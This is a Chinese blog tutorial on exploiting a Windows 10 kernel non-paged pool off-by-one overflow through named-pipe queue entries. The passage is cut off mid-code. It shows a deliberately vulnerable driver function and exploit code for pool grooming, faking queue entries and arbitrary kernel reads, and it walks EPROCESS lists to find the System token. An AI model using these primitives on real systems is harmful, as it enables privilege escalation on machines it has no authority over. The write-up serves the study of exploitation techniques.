<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Joe1sn's Cabin | 【Win Pwn】Windows10 内核池溢出</title><meta name="description" content="&lt;p&gt;内核也太难了，主要讲述大NonPagedPool的溢出利用&lt;/p&gt;
&lt;p&gt;公众号：&lt;a href=&quot;https://mp.weixin.qq.com/s/XjaPdNwqABFqDZsZTDtZJg&quot;&gt;https://mp.weixin.qq.com/s/XjaPdNwqABFqDZsZTDtZJg&lt;/a&gt;&lt;/p&gt;"><link rel="icon" href="/images/favicon.png"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700"><link rel="stylesheet" href="/css/highlights/darkula.css"><link rel="stylesheet" href="/css/main.css"><link rel="search" type="application/opensearchdescription+xml" href="https://joe1sn.eu.org/atom.xml" title="Joe1sn's Cabin"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Joe1sn's Cabin" type="application/atom+xml">
</head><body><div class="container"><header class="main-header"><h1 class="main-header__title uplize"><a class="main-header__title__link" href="/">Joe1sn's Cabin</a></h1><nav class="main-header__nav"><ul class="main-nav"><li class="main-nav__list"><a class="main-nav__list__link" href="/" target="_self">HOME</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="/archives/" target="_self">ARCHIVE</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn" target="_blank">GITHUB</a></li></ul></nav></header><main class="container__wrapper"><article class="article post"><h3 class="article__title">【Win Pwn】Windows10 内核池溢出</h3><div class="article__date metadata"><div class="post-info">2025/04/16</div></div><div class="article__tags metadata">Tags:
<a class="article__tags__link metadata" href="/tags/kernel/">kernel</a><a class="article__tags__link metadata" href="/tags/windows/">windows</a><a class="article__tags__link metadata" href="/tags/pwn/">pwn</a></div><div class="article__body"><p>内核也太难了，主要讲述大NonPagedPool的溢出利用</p>
<p>公众号：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/XjaPdNwqABFqDZsZTDtZJg">https://mp.weixin.qq.com/s/XjaPdNwqABFqDZsZTDtZJg</a></p>
<span id="more"></span>
<p>或许我们的公众号会有更多你感兴趣的内容</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/a0d42261f5e0b243c214f5af9049fc29.jpg" alt="img" /></p>
<h1 id="复现windows10-内核池溢出"><a class="markdownIt-Anchor" href="#复现windows10-内核池溢出"></a> 【复现】Windows10 内核池溢出</h1>
<p>前置知识：</p>
<ol>
<li>windows内核调试</li>
<li>windows内核提权基础</li>
<li>简单的windows驱动编写（hello world级别）</li>
<li>linux pwn堆溢出利用方式</li>
<li>一点点数据结构的知识（双向链表）</li>
</ol>
<p>文章讲述并复现在Windows高版本内核中NonPagedPoolNx溢出的利用方法</p>
<h1 id="目录"><a class="markdownIt-Anchor" href="#目录"></a> 目录</h1>
<p>[toc]</p>
<h1 id="利用方式"><a class="markdownIt-Anchor" href="#利用方式"></a> 利用方式</h1>
<p>​	很多资料都是直接翻译外文文献，翻译质量差，没有直接的实操，并且随着windows的更新，比较缺乏现代windows 10\11的、比较易学的攻击方式。这里使用：<a target="_blank" rel="noopener" href="https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation">Windows-Non-Paged-Pool-Overflow-Exploitation</a>[1]作为基础的讲解，原文中的图示个人感觉还是讲的不够透彻,这里个人借着原文重新讲述下。</p>
<h2 id="命名管道介绍"><a class="markdownIt-Anchor" href="#命名管道介绍"></a> 命名管道介绍</h2>
<p>​	这是windows提供的用于进程间通讯的一种机制。首先是**服务端(server)**创建命名管道，**客户端(client)**使用<code>CreateFile</code>连接到服务端。双方可以使用<code>ReadFile</code>和<code>WriteFile</code>进行读、写的通讯。这种利用方式非常常见，比如说在<code>cobaltstrike</code>的木马中就是用到了这种通讯，具体例子可以参考公众号的文章： <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/9ReEchLx1dTbWR9plRWbpg">【免杀】使用CobaltStrike的外置监听器绕过检测</a>[2]。</p>
<p>​	当管道成功建立后，底层驱动程序(<code>npfs.sys</code>)会在上下文控制块 (CCB) 中创建两个队列，每个队列对应一个CCB队列。当有消息写入时，比如**服务端想客户端发送消息(<code>WriteFile</code>)**时，会在队列中创建如下结构体，<strong>后文简称为dqe</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DATA_QUEUE_ENTRY</span> &#123;</span></span><br><span class="line">    LIST_ENTRY NextEntry;</span><br><span class="line">    _IRP* Irp;</span><br><span class="line">    _SECURITY_CLIENT_CONTEXT* SecurityContext;</span><br><span class="line">    <span class="type">uint32_t</span> EntryType;</span><br><span class="line">    <span class="type">uint32_t</span> QuotaInEntry;</span><br><span class="line">    <span class="type">uint32_t</span> DataSize;</span><br><span class="line">    <span class="type">uint32_t</span> x;</span><br><span class="line">    <span class="type">char</span> Data[];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当**客户端开始接收消息(<code>ReadFile</code>)**时，就会从队列中释放掉该消息</p>
<img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/DATA_QUEUE_ENTRY.drawio.png" alt="DATA_QUEUE_ENTRY.drawio" style="zoom: 33%;" />
<ul>
<li>
<p><strong>NextEntry</strong>: Windows中的经典 <strong>双向循环链表</strong>，<code>LIST_ENTRY</code>中<code>flink</code>指向下一个<code>entry</code>，<code>blink</code>指向上一个。当结构体被释放时(如执行<code>ReadFile</code>)，会进行相邻结构体链表之间的重新连接，也就是数据结构中双向链表中的删除操作。注意的是，在windows 10中新增了校验操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">entry-&gt;Flink-&gt;Blink!=entry</span><br></pre></td></tr></table></figure>
<p>这样可以避免溢出时覆盖<code>entry-&gt;flink</code>的<code>blink</code>，造成的劫持</p>
</li>
<li>
<p><strong>SecurityContext</strong>: 安全上下文，主要是模仿客户端的行为，比如客户端访问权限等，在这里并不重要。</p>
</li>
<li>
<p><strong>EntryType</strong>: <code>DATA_QUEUE_ENTRY</code>的类型，一般分为两种：<code>buffered</code>和<code>unbuffered</code></p>
<ul>
<li>
<p><code>buffered</code>: <code>EntryType=0</code>，<strong><code>DATA_QUEUE_ENTRY</code> 中申请的<code>buf</code>大小足够存放<code>UserData</code></strong>，读取时直接从<code>UserData</code>处复制</p>
</li>
<li>
<p><code>unbuffered</code>: <code>EntryType=1</code>，<strong><code>DATA_QUEUE_ENTRY</code> 中申请的<code>buf</code>大小只存放<code>DATA_QUEUE_ENTRY</code></strong>，读取时要调用<code>IRP</code>来实现读取。可以使用如下函数来创建这种<code>Entry</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NtFsControlFile(pipe_handle, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, &amp;isb, <span class="number">0x119FF8</span>, buf, sz, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><strong>Irp</strong>: 处理的中断请求</p>
</li>
<li>
<p><strong>QuotaInEntry</strong>: 空间剩余配额，对于<code>buffered</code>来说，每次读取可能不会全部读完，<code>QuotaInEntry</code>记录了剩余<code>UserData</code>读取的大小，即<code>QuotaInEntry</code>初始值等于<code>DataSize</code>，每次读取都会减去已经读取的长度，直到<code>QuotaInEntry=0</code>；对于<code>unbuffered</code>来说值恒为<code>0</code>。</p>
</li>
<li>
<p><strong>DataSize</strong>: 很重要，它描述了<code>UserData</code>的大小。</p>
</li>
</ul>
<p>当服务端想客户端发送消息时，<code>npfs</code>会申请<code>0x30+DataSize</code>大小(并会对齐)的内核池，其中<code>0x30</code>是为了存放<code>DATA_QUEUE_ENTRY</code>头部</p>
<h2 id="配额管理机制"><a class="markdownIt-Anchor" href="#配额管理机制"></a> 配额管理机制</h2>
<p>配额管理机制(QuotaInEntry)：允许通信通道的服务器端指定队列可容纳的<strong>最大数据大小</strong>。<strong>超过该限制时</strong>：</p>
<ul>
<li>在阻塞模式 (PIPE_WAIT) 下，创建条目时将 QuotaInEntry 设置为当前队列中可用的字节数。之后，每次对缓冲条目执行读取（read而非peek）操作后，读取大小都会添加到已停止写入的 QuotaInEntry 中。当 QuotaInEntry 等于 DataSize 时，表示管道配额中有足够的空间容纳该条目，并且其关联的 IRP 已完成，qde从当前数据条目中移除。</li>
<li>在非阻塞模式 (PIPE_NOWAIT) 下，操作将失败。（写入的字节数将等于 0）</li>
</ul>
<h2 id="漏洞代码"><a class="markdownIt-Anchor" href="#漏洞代码"></a> 漏洞代码</h2>
<p>这里使用：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation/blob/5315ee63753b0747d5a6010e2486dfbe45b8e123/vulnerable_driver/Overfl0w.cpp#L68">https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation/blob/5315ee63753b0747d5a6010e2486dfbe45b8e123/vulnerable_driver/Overfl0w.cpp#L68</a></p>
<p>这段代码的64位编译进行讲解，同时我增加了一段打印来方便调试</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS <span class="title function_">Al20c</span><span class="params">(<span class="type">size_t</span> Size)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span>* buf = (<span class="type">char</span>*)ExAllocatePoolWithTag(NonPagedPoolNx, Size, <span class="string">&#x27;AAAA&#x27;</span>);</span><br><span class="line">	DbgPrint(<span class="string">&quot;[!] Allocate NonpagedPool 0x%p\n&quot;</span>, buf);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= Size &amp;&amp; buf; i++)</span><br><span class="line">		buf[i] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>for</code>循环中有一个明显的 <strong>off by one</strong> 漏洞(应当是<code>i &lt; Size</code>)，可以溢出到下一个区块一个字节，并修改为<code>0x20</code></p>
<p>测试环境是</p>
<img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250415100612979.png" alt="image-20250415100612979" style="zoom: 80%;" />
<p>具体环境搭建可以参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12806">从零探索现代windows内核栈溢出-以HEVD练习为例（上）</a>[3]</p>
<h2 id="如何完成提权"><a class="markdownIt-Anchor" href="#如何完成提权"></a> 如何完成提权</h2>
<p>这里就是利用任意地址读写来对<code>System</code>的<code>token</code>复制到当前进程</p>
<h2 id="任意地址读实现"><a class="markdownIt-Anchor" href="#任意地址读实现"></a> 任意地址读实现</h2>
<p>假设有如下布局</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/read.drawio.png" alt="Fig1" /></p>
<p>​	AAAA、BBBB、CCCC三个<code>DATA_QUEUE_ENTRY</code>是逻辑上的相邻关系，<strong>但是在内存上，紫色page与BBBB相邻</strong>，所以<code>BBBB-&gt;Flink</code>低位被溢出了，这也是在linux pwn的堆利用中很常见的<code>off by one</code>利用手法。这使得<code>BBBB-&gt;Flink</code>指向了<code>CCCC+0x20</code>的位置，那么我们就可以提前在我们可控的<code>CCCC-&gt;UserData</code>里面构建<code>fake EntryType</code>、<code>fake Quota</code>和最<strong>重要的<code>Fake DataSize</code></strong></p>
<p>​	但是前文中说过<code>fake flink</code>由于不是我们可控的，所以使用<code>ReadFile</code>读取<code>pipe_pool_x</code>会通不过检验，<strong>但是[1]中发现一个新的方法可以绕过，即使用<code>PeekNamedPipe</code>函数</strong>，这个函数可以读取<code>pipe_pool_x</code>中的数据，而不造成释放和校验。假设<code>pipe_pool_x</code>是从AAAA开始的，那么客户端在<code>pipe_pool_x</code>读取<code>DataSize_AAAA+DataSize_BBBB+DataSize_Fake_CCCC</code>大小的数据时候，顺序就是，1.读取<code>AAAA-&gt;UserData DataSize_AAAA</code> 大小的数据；2.根据<code>AAAA-&gt;Flink</code>找到BBBB，再读取；3.根据<code>BBBB-&gt;overflown_Flink</code>找打Fake_CCCC，同时根据<code>Fake_CCCC-&gt;Fake-&gt;DataSize</code>的大小读取内存。而且这种方法可以放我们判断溢出的<code>pipe_pool</code>是哪个，这在池喷射中是十分有利的。</p>
<p>​	**那么如何实现任意地址读取呢？**我们可以看看[1]中的exp是怎么做到的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NP_HEADER_SIZE 0x30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> THIRD_ENTRY_SIZE (0x1000-NP_HEADER_SIZE)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USER_DATA_ENTRY_ADDR ((long long)THIRD_ENTRY_SIZE&lt;&lt;32)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">if</span> (VirtualAlloc((PVOID)USER_DATA_ENTRY_ADDR, <span class="number">0x5000</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != (PVOID)USER_DATA_ENTRY_ADDR) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Couldn&#x27;t allocate base address %p\n&quot;</span>, USER_DATA_ENTRY_ADDR);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Creating the RIGHT entries\n&quot;</span>);</span><br><span class="line">    <span class="type">char</span> victim_data[THIRD_ENTRY_SIZE];</span><br><span class="line">    DATA_QUEUE_ENTRY* dqe = (DATA_QUEUE_ENTRY*)victim_data;</span><br><span class="line">    <span class="built_in">memset</span>(dqe, <span class="number">0</span>, <span class="keyword">sizeof</span>(*dqe));</span><br><span class="line">    dqe-&gt;DataSize = THIRD_ENTRY_SIZE + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pipe_pool.size(); i++) &#123;</span><br><span class="line">        WriteFile(pipe_pool[i].Write, &amp;dqe-&gt;Irp, THIRD_ENTRY_SIZE, &amp;res, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​	<code>USER_DATA_ENTRY_ADDR</code>计算出来的值是**<code>0xfd000000000</code><strong>，在Creating the RIGHT entries时，申请的dqe中，<code>dqe-&gt;quota=0xfd0</code>，<code>dqe-&gt;DataSize=0xfd0</code>，根据</strong>小端序<strong>在内存中的排列方式从右到左，<code>dqe-&gt;quota</code>和临近的32位大小全为0的<code>dqe-&gt;EntryTpye</code>的值，合成<code>fake-&gt;flink</code>，而且指向</strong><code>0xfd000000000</code>**。分配变为：</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/read.drawio2.png" alt="read.drawio2" /></p>
<p>​	相关的内存信息：</p>
<img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250415105505624.png" alt="image-20250415105505624" style="zoom:50%;" />
<img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250415111307748.png" alt="image-20250415111307748" style="zoom:67%;" />
<p>​	参考最初始的布局图，如果我们想要读取的内容长度超过了<code>DataSize_AAAA+DataSize_BBBB+DataSize_Fake_CCCC</code>，那么就会从<code>FakeCCCC-&gt;flink</code>即**<code>0xfd000000000</code><strong>当作一个<code>DATA_QUEUE_ENTRY</code>，来满足我们的读取。这个时候exp中最开始的<code>VritualAlloc</code>就起到了关键作用，因为他申请到了</strong><code>0xfd000000000</code><strong>这一地址，<strong>即使这个地址不是在内核0xfd000000000中，而是在当前的进程中</strong>，我们就可以在这里伪造<code>DATA_QUEUE_ENTRY</code>，并且</strong>使用<code>unbuffered</code>类型来利用<code>Irp</code>实现内核的任意地址读取**。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PrepareDataEntryForRead</span><span class="params">(DATA_QUEUE_ENTRY* dqe, IRP* irp, <span class="type">uint64_t</span> read_address)</span> &#123;</span><br><span class="line">    <span class="built_in">memset</span>(dqe, <span class="number">0</span>, <span class="keyword">sizeof</span>(DATA_QUEUE_ENTRY));</span><br><span class="line">    dqe-&gt;EntryType = <span class="number">1</span>;</span><br><span class="line">    dqe-&gt;DataSize = <span class="number">-1</span>;</span><br><span class="line">    dqe-&gt;Irp = irp;</span><br><span class="line">    irp-&gt;AssociatedIrp = (PVOID)read_address;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ReadMem</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">size_t</span> len, <span class="type">char</span>* data)</span> &#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span>* buf = (<span class="type">char</span>*)<span class="built_in">malloc</span>(TOTAL_DATA_SIZE + <span class="number">1</span> + <span class="number">0x5000</span>);</span><br><span class="line">    DATA_QUEUE_ENTRY* dqe = (DATA_QUEUE_ENTRY*)USER_DATA_ENTRY_ADDR;</span><br><span class="line">    DWORD read;</span><br><span class="line"></span><br><span class="line">    assert(len &lt; <span class="number">0x5000</span>);</span><br><span class="line"></span><br><span class="line">    PrepareDataEntryForRead(dqe, (IRP*)(USER_DATA_ENTRY_ADDR + <span class="number">0x1000</span>), addr);</span><br><span class="line">    PeekNamedPipe(g_victim_pipe-&gt;Read, buf, TOTAL_DATA_SIZE + <span class="number">1</span> + len, &amp;read, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(data, buf + TOTAL_DATA_SIZE + <span class="number">1</span>, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>如何读取到当前进程的Token地址？</strong></p>
<p>​	与常规思路类似，我们依旧是找到当前进程的<code>EPROCESS</code>。首先基于此我们拥有了任意地址读，那么就可以泄露出一个正常的<code>DATA_QUEUE_ENTRY</code>，比如和CCCC物理地址相邻的dqe，我们称为<strong>DDDD</strong>(如上图)。exp中的DDDD是这样申请的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">DWORD WINAPI <span class="title function_">ThreadedWriter</span><span class="params">(<span class="type">void</span>* arg)</span> &#123;</span><br><span class="line">    <span class="type">char</span>* buf = (<span class="type">char</span>*)arg;</span><br><span class="line">    DWORD res;</span><br><span class="line"></span><br><span class="line">    WriteFile(g_victim_pipe-&gt;Write, buf, FIRST_ENTRY_SIZE, &amp;res, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    Sleep(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Creating an entry with size greater than the available pipe quota\n&quot;</span>);</span><br><span class="line">    CreateThread(<span class="number">0</span>, <span class="number">0</span>, ThreadedWriter, buf, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">//we could have used overlapped/completion routines</span></span><br><span class="line">    Sleep(<span class="number">2000</span>);</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">    <span class="comment">//&amp;((ETHREAD*)0)-&gt;ThreadListHead.Flink-&amp;((EHREAD)*0)-&gt;IrpList=0x38, remains constant between most recent builds</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250415123334730.png" alt="image-20250415123334730" style="zoom:67%;" />
<p>​	<code>DDDD-&gt;Irp</code>结构具体如下，详细可见<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp">IRP 结构 （wdm.h）</a>[4]</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dt nt!_IRP</span><br></pre></td></tr></table></figure>
<img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250415114100503.png" alt="image-20250415114100503" style="zoom:67%;" />
<img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250415123735198.png" alt="image-20250415123735198" style="zoom: 80%;" />
<img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250415123659967.png" alt="image-20250415123659967" style="zoom:67%;" />
<p>​	这里又引申小问题：为什么要使用<code>CreateThread</code>来进行新的dqe？这就要提到<code>ThreadListEntry</code>的作用了</p>
<blockquote>
<p>当一个线程发起异步 I/O 操作时，内核会将 IRP 插入到线程的 <code>ThreadListEntry</code> 链表中。线程可以通过遍历该链表检查是否有未完成的 I/O 请求。</p>
</blockquote>
<p>​	这里创建线程来创建起到的就是 <strong>线程发起异步 I/O 操作</strong> 的作用。在 Windows 内核中，每个线程都由一个 <code>ETHREAD</code>（Executive Thread）结构体表示，其中包含一个 <code>IrpList</code> 字段，用于管理该线程的所有 <strong>挂起（Pending）I/O 请求</strong>（即未完成的 IRP）</p>
<p>​	我们查看这个Irp所属的线程是那个<code>_ETHREAD</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; dt nt!_IRP ffffbe0f`9d473c30 Tail.Overlay.Thread</span><br><span class="line">   +0x078 Tail                : </span><br><span class="line">      +0x000 Overlay             : </span><br><span class="line">         +0x020 Thread              : 0xffffbe0f`9d0cb080 _ETHREAD</span><br><span class="line">0: kd&gt; dt nt!_ETHREAD 0xffffbe0f`9d0cb080 Tcb</span><br><span class="line">   +0x000 Tcb : _KTHREAD</span><br></pre></td></tr></table></figure>
<img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250415132619853.png" alt="image-20250415132619853" style="zoom:67%;" />
<p>​	<code>_ETHREAD</code>结构体如下</p>
<img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250415132206261.png" alt="image-20250415132206261" style="zoom:67%;" />
<p>​	如果你了解过windows内核提权的方法的话，如<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12808">从零探索现代windows内核栈溢出-以HEVD练习为例（下）</a>[5]，你就会了解到在栈溢出中我们使用的是<code>gs:[188h]</code>指向的是一个<code>_KTHREAD</code>结构体，通过<code>_KTHREAD</code>找到<code>_EPROECSS</code>，然后找到了当前进程的<code>_EPROCESS</code>，而且就可以通过遍历得到 <strong>System</strong> 的<code>_EPROCESS</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; !thread 0xffffbe0f9d0cb080</span><br><span class="line">THREAD ffffbe0f9d0cb080  Cid 0ea8.0c30  Teb: 000000f50d798000 Win32Thread: 0000000000000000 WAIT: (UserRequest) UserMode Non-Alertable</span><br><span class="line">    ffffbe0f9ff9f668  NotificationEvent</span><br><span class="line">IRP List:</span><br><span class="line">    ffffbe0f9d473c30: (0006,0358) Flags: 00060a00  Mdl: 00000000</span><br><span class="line">Not impersonating</span><br><span class="line">DeviceMap                 ffff8486d91f0b10</span><br><span class="line">Owning Process            ffffbe0f9da7e340       Image:         exploits.exe</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/image-20250415132850919.png" alt="image-20250415132850919" /></p>
<p>​	之后通过``EPROCESS<code>获得自身</code>ActiveProcessLinks`，同时向前/向后查找，找到pid=4的进程，则该进程就为System，之后就是根据偏移读取Token</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> <span class="title function_">GetProcessById</span><span class="params">(<span class="type">uint64_t</span> first_process, <span class="type">uint64_t</span> pid)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> current_pid = <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint64_t</span> current_process = first_process;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        ReadMem(current_process + c_offsets[g_setoff][EPROCESS_PID], <span class="number">8</span>, (<span class="type">char</span>*)&amp;current_pid);</span><br><span class="line">        <span class="keyword">if</span> (current_pid == pid)</span><br><span class="line">            <span class="keyword">return</span> current_process;</span><br><span class="line"></span><br><span class="line">        ReadMem(current_process + c_offsets[g_setoff][EPROCESS_PID] + <span class="number">8</span>, <span class="number">8</span>, (<span class="type">char</span>*)&amp;current_process);</span><br><span class="line">        current_process -= c_offsets[g_setoff][EPROCESS_PID] + <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (current_process == first_process)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="type">char</span> irp_data[<span class="number">0x1000</span>];</span><br><span class="line">    ReadMem(irp_addr, <span class="number">0x1000</span>, irp_data);</span><br><span class="line">    IRP* irp = (IRP*)irp_data;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> cp_thread_list_head, current_process, current_process_id, system_process;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//&amp;((ETHREAD*)0)-&gt;ThreadListHead.Flink-&amp;((EHREAD)*0)-&gt;IrpList=0x38, remains constant between most recent builds</span></span><br><span class="line">    ReadMem((<span class="type">uint64_t</span>)irp-&gt;ThreadListEntry.Flink + <span class="number">0x38</span>, <span class="number">8</span>, (<span class="type">char</span>*)&amp;cp_thread_list_head);</span><br><span class="line">    current_process = cp_thread_list_head - c_offsets[g_setoff][EPROCESS_THREADLISTHEAD];</span><br><span class="line">    ReadMem(current_process + c_offsets[g_setoff][EPROCESS_PID], <span class="number">8</span>, (<span 